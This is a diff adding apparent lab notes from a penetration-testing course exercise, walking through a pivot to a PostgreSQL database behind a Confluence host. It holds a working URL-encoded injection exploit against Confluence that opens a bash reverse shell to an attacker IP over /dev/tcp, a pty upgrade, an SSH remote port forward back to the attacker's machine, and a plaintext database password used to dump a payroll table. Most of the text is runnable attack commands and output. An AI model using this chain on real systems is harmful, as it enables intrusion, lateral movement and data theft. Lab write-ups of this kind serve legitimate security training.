@@ -1,0 +1,42 @@
+# Questions 1
+
+# Backgrounds: victim machine dont have SSH server so cannot perform port forward. But attacker want to enumerate the PSQL database running on port 5432 on PGDATABASE01. CONFLUENCE01 doesn't have the tool to do this. However CONFLUENCE01 does have an SSH client, and we can setup SSH server on our KALI and create a REMOTE PORT FORWARDING setup. 
+
+# On Kali OS
+sudo systemctl start ssh
+sudo systemctl status ssh
+...
+May 05 00:01:17 kali sshd[71826]: Server listening on 0.0.0.0 port 22.
+...
+
+# Once we have a reverse shell from CONFLUENCE01, we ensure we have a TTY shell, then create an SSH remote port forward as part of an SSH connection back to our Kali machine.
+
+# In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.
+
+# Lets try to get the CONFLUENCE01 shell
+#Setup MSFConsole to listen port 4444
+curl -v http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Upgrade to fully interactive
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Create Remote port forwarding
+# The SSH remote port forward option is -R, and has a very similar syntax to the local port forward option. It also takes two socket pairs as the argument. The listening socket is defined first, and the forwarding socket is second.
+
+# Do it on CONFLUENCE01
+ssh -N -R 127.0.0.1:2345:10.4.180.215:5432 kali@192.168.45.237
+# The SSH connection back to our Kali machine was successful.
+
+# We can confirm that our remote port forward port is listening by checking port 2345 is open on our KALI
+ss -tulpn
+tcp    LISTEN  0        128            127.0.0.1:2345 
+
+psql -h 127.0.0.1 -p 2345 -U postgres
+password: D@t4basePassw0rd!
+
+postgres=# \l # List Database
+postgres=# \c hr_backup # connect to hr_backup database
+postgres=# SELECT * FROM payroll;
+ id |                 flag                 
+----+--------------------------------------
+  0 | OS{7398a84b1657c67c102adbfca6d033e0}
